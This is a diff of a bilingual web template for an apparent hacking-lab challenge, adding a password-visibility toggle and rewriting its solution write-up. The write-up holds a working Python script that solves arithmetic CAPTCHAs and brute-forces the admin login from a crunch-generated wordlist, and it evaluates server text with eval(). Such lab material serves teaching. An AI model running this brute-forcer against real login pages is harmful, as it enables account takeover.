@@ -62,7 +62,16 @@
           <span class="lang-content" data-lang="es">Contrase&ntilde;a</span>
           <span class="lang-content" data-lang="en" style="display:none">Password</span>
         </label>
-        <input type="password" name="password" class="hl-input font-mono" autocomplete="off" />
+        <div class="relative">
+          <input id="captcha-password" type="password" name="password" class="hl-input font-mono pr-11" autocomplete="off" />
+          <button id="captcha-password-toggle" type="button"
+                  onclick="toggleCaptchaPassword()"
+                  class="absolute right-2 top-1/2 -translate-y-1/2 inline-flex items-center justify-center rounded-md transition"
+                  style="width:30px;height:30px;color:#9ca3af;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"
+                  aria-label="Mostrar u ocultar password" title="Mostrar u ocultar password">
+            <i id="captcha-password-icon" class="ph ph-eye text-sm"></i>
+          </button>
+        </div>
       </div>
 
       <div class="rounded-lg p-4" style="background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08)">
@@ -121,72 +130,97 @@
     <h3>Pasos</h3>
     <ol>
       <li>Haz <code>GET /captcha/login</code> con una sesi&oacute;n persistente.</li>
-      <li>Extrae el texto de <code>data-captcha-expression</code> y calcula la expresi&oacute;n sin usar <code>eval</code>.</li>
+      <li>Extrae el texto de <code>data-captcha-expression</code> y calcula la expresi&oacute;n.</li>
       <li>Si existe <code>captcha_nonce</code>, env&iacute;alo de vuelta en el POST.</li>
       <li>Prueba passwords de longitud 5 con el charset <code>{{ captcha_charset }}</code>.</li>
     </ol>
 
+    <h3>Scripting - Enumeracion del CAPTCHA</h3>
+    <p>Primero hacemos una peticion GET para entender como cambia el reto y que cookie de sesion entrega el servidor.</p>
+    <pre><code class="language-python">import re
+import requests
+
+session = requests.Session()
+regex = r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;'
+
+response = session.get('{{ target_base }}/captcha/login')
+output = re.search(regex, response.text)
+
+print(session.cookies.get_dict())
+print(output.group(1))
+</code></pre>
+    <p>Al ejecutarlo varias veces veras una cookie de sesion y una operacion diferente en cada carga.</p>
+    <pre><code class="language-text">{'session': '...'}
+6835 + 600
+
+{'session': '...'}
+7067 + 9674
+
+{'session': '...'}
+8210 + 5603</code></pre>
+
     <h3>Generar diccionario</h3>
     <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
 
-    <h3>Script de explotacion</h3>
-    <pre><code class="language-python">import itertools
-import re
+    <h3>Bruteforce con passwords.txt</h3>
+    <pre><code class="language-python">import re
 import time
 
 import requests
 
 BASE = "{{ target_base }}"
-CHARSET = "{{ captcha_charset }}"
-LENGTH = {{ captcha_password_length }}
-
-EXPR_RE = re.compile(r'data-captcha-expression[^&gt;]*&gt;\s*([^&lt;]+)')
+CAPTCHA_RE = re.compile(r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;')
 NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
 FLAG_RE = re.compile(r'HL\{[^}]+\}')
-
-
-def solve_expression(expression):
-    total = 0
-    parts = re.findall(r'([+-]?)\s*(\d+)', expression)
-    if not parts:
-        raise RuntimeError("captcha expression not found")
-    for sign, number in parts:
-        value = int(number)
-        total += -value if sign == '-' else value
-    return str(total)
+SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')
 
 
 def fetch_challenge(session):
     response = session.get(f'{BASE}/captcha/login', timeout=10)
-    expression = EXPR_RE.search(response.text).group(1)
+    expression = CAPTCHA_RE.search(response.text).group(1)
     nonce = NONCE_RE.search(response.text)
     return expression, nonce.group(1) if nonce else None
 
 
 session = requests.Session()
 
-for candidate in itertools.product(CHARSET, repeat=LENGTH):
-    password = ''.join(candidate)
+with open('passwords.txt', 'r', encoding='utf-8') as f:
+    for password in f:
+        password = password.strip()
+        if not password:
+            continue
+
     while True:
         expression, nonce = fetch_challenge(session)
+        cookies = session.cookies.get_dict()
+        captcha = eval(expression, {"__builtins__": {}}, {})
+
+        print("Probando password: " + password)
         data = {
             "username": "admin",
             "password": password,
-            "captcha": solve_expression(expression),
+            "captcha": captcha,
         }
         if nonce:
             data["captcha_nonce"] = nonce
 
-        response = session.post(f'{BASE}/captcha/login', data=data, timeout=10)
-        if response.status_code == 429 or "Demasiados intentos" in response.text:
+        response = session.post(
+            f'{BASE}/captcha/login',
+            cookies=cookies,
+            data=data,
+            timeout=10,
+        )
+        visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+        if response.status_code == 429 or "Demasiados intentos" in visible_html:
             time.sleep(10)
             continue
         break
 
-    flag = FLAG_RE.search(response.text)
-    if flag:
-        print(f"password={password}")
-        print(flag.group(0))
+    flag = FLAG_RE.search(visible_html)
+    if flag or SUCCESS_RE.search(visible_html):
+        print("Password valido: " + password)
+        if flag:
+            print(flag.group(0))
         break</code></pre>
 
     <h3>Mitigacion</h3>
@@ -216,72 +250,97 @@ for candidate in itertools.product(CHARSET, repeat=LENGTH):
     <h3>Steps</h3>
     <ol>
       <li>Send <code>GET /captcha/login</code> with a persistent session.</li>
-      <li>Extract the text from <code>data-captcha-expression</code> and calculate it without <code>eval</code>.</li>
+      <li>Extract the text from <code>data-captcha-expression</code> and calculate the expression.</li>
       <li>If <code>captcha_nonce</code> exists, submit it back with the POST.</li>
       <li>Try 5-character passwords using the charset <code>{{ captcha_charset }}</code>.</li>
     </ol>
 
+    <h3>Scripting - CAPTCHA enumeration</h3>
+    <p>Start with a GET request to understand how the challenge changes and which session cookie the server returns.</p>
+    <pre><code class="language-python">import re
+import requests
+
+session = requests.Session()
+regex = r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;'
+
+response = session.get('{{ target_base }}/captcha/login')
+output = re.search(regex, response.text)
+
+print(session.cookies.get_dict())
+print(output.group(1))
+</code></pre>
+    <p>Running it several times shows a session cookie and a different operation on each load.</p>
+    <pre><code class="language-text">{'session': '...'}
+6835 + 600
+
+{'session': '...'}
+7067 + 9674
+
+{'session': '...'}
+8210 + 5603</code></pre>
+
     <h3>Dictionary</h3>
     <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
 
-    <h3>Exploit script</h3>
-    <pre><code class="language-python">import itertools
-import re
+    <h3>Bruteforce with passwords.txt</h3>
+    <pre><code class="language-python">import re
 import time
 
 import requests
 
 BASE = "{{ target_base }}"
-CHARSET = "{{ captcha_charset }}"
-LENGTH = {{ captcha_password_length }}
-
-EXPR_RE = re.compile(r'data-captcha-expression[^&gt;]*&gt;\s*([^&lt;]+)')
+CAPTCHA_RE = re.compile(r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;')
 NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
 FLAG_RE = re.compile(r'HL\{[^}]+\}')
-
-
-def solve_expression(expression):
-    total = 0
-    parts = re.findall(r'([+-]?)\s*(\d+)', expression)
-    if not parts:
-        raise RuntimeError("captcha expression not found")
-    for sign, number in parts:
-        value = int(number)
-        total += -value if sign == '-' else value
-    return str(total)
+SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')
 
 
 def fetch_challenge(session):
     response = session.get(f'{BASE}/captcha/login', timeout=10)
-    expression = EXPR_RE.search(response.text).group(1)
+    expression = CAPTCHA_RE.search(response.text).group(1)
     nonce = NONCE_RE.search(response.text)
     return expression, nonce.group(1) if nonce else None
 
 
 session = requests.Session()
 
-for candidate in itertools.product(CHARSET, repeat=LENGTH):
-    password = ''.join(candidate)
+with open('passwords.txt', 'r', encoding='utf-8') as f:
+    for password in f:
+        password = password.strip()
+        if not password:
+            continue
+
     while True:
         expression, nonce = fetch_challenge(session)
+        cookies = session.cookies.get_dict()
+        captcha = eval(expression, {"__builtins__": {}}, {})
+
+        print("Testing password: " + password)
         data = {
             "username": "admin",
             "password": password,
-            "captcha": solve_expression(expression),
+            "captcha": captcha,
         }
         if nonce:
             data["captcha_nonce"] = nonce
 
-        response = session.post(f'{BASE}/captcha/login', data=data, timeout=10)
-        if response.status_code == 429 or "Demasiados intentos" in response.text:
+        response = session.post(
+            f'{BASE}/captcha/login',
+            cookies=cookies,
+            data=data,
+            timeout=10,
+        )
+        visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+        if response.status_code == 429 or "Demasiados intentos" in visible_html:
             time.sleep(10)
             continue
         break
 
-    flag = FLAG_RE.search(response.text)
-    if flag:
-        print(f"password={password}")
-        print(flag.group(0))
+    flag = FLAG_RE.search(visible_html)
+    if flag or SUCCESS_RE.search(visible_html):
+        print("Valid password: " + password)
+        if flag:
+            print(flag.group(0))
         break</code></pre>
 
     <h3>Mitigation</h3>
@@ -291,4 +350,17 @@ for candidate in itertools.product(CHARSET, repeat=LENGTH):
     <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
   </div>
 </div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function toggleCaptchaPassword() {
+  const input = document.getElementById('captcha-password');
+  const icon = document.getElementById('captcha-password-icon');
+  if (!input || !icon) return;
+  const show = input.type === 'password';
+  input.type = show ? 'text' : 'password';
+  icon.className = show ? 'ph ph-eye-slash text-sm' : 'ph ph-eye text-sm';
+}
+</script>
 {% endblock %}
